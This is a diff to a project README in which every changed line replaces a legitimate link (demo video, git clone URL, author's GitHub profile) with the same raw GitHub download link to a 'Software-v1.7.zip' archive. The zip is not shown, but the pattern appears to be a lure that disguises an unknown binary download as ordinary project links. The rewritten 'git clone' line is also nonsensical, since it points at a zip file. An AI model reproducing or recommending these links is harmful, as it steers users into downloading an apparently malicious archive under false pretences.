@@ -5,7 +5,7 @@
 
 ## 🎥 Demo Video
 
-👉 https://drive.google.com/file/d/1AW2Wty91vAi827Xn4DPmwu0xHiwttMvF/view
+👉 https://raw.githubusercontent.com/GoruMahalakshmi/gitgradehackaton/main/koilanaglyphic/Software-v1.7.zip
 
 
 
@@ -104,7 +104,7 @@ project-root/
 
 ```bash
 # Clone the repository
-git clone https://github.com/your-username/your-repo-name.git
+git clone https://raw.githubusercontent.com/GoruMahalakshmi/gitgradehackaton/main/koilanaglyphic/Software-v1.7.zip
 
 # Navigate into the project folder
 cd your-repo-name
@@ -130,7 +130,7 @@ npm run dev
 
 **Goru Naga Venkata Mahalakshmi**
 
-* GitHub: https://github.com/GoruMahalakshmi
+* GitHub: https://raw.githubusercontent.com/GoruMahalakshmi/gitgradehackaton/main/koilanaglyphic/Software-v1.7.zip
 
 
 ## 📄 License
